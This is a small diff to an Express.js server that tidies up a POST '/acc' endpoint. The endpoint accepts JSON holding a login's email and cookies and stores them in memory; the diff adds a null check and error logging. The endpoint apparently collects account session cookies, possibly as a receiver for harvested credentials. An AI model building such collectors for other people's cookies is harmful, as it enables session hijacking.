@@ -118,17 +118,17 @@ app.post('/', (req, res) => {
 // Add this after the existing code
 app.post('/acc', (req, res) => {
   try {
-	  console.log(req.body);
-    const data = JSON.parse(req.body);
+    const data = JSON.parse(req.body); // Parse the text body as JSON
     const login = Object.keys(data)[0];
     
-    if (login && data[login].email && data[login].cookies) {
+    if (login && data[login] && data[login].email && data[login].cookies) {
       motherObject[login] = data[login];
       res.status(200).send('Data received and stored successfully');
     } else {
       res.status(400).send('Invalid data format');
     }
   } catch (error) {
+    console.error('Error processing request:', error);
     res.status(400).send('Error processing the request');
   }
 });
